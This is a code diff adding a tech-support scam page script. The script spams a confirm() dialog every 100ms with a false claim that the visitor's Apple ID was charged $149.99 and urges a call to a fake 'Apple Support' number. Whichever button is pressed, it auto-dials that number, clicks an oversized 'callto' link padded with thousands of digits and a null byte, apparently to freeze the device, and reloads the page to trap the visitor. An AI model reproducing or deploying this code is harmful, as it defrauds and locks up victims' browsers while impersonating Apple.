+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
+
+
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-866-381-6140');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-866-381-6140"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-866-381-6140 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+<script defer="" data-domain="iosmd.sire" src="js/script.js"></script>
+
+
+</body></html>
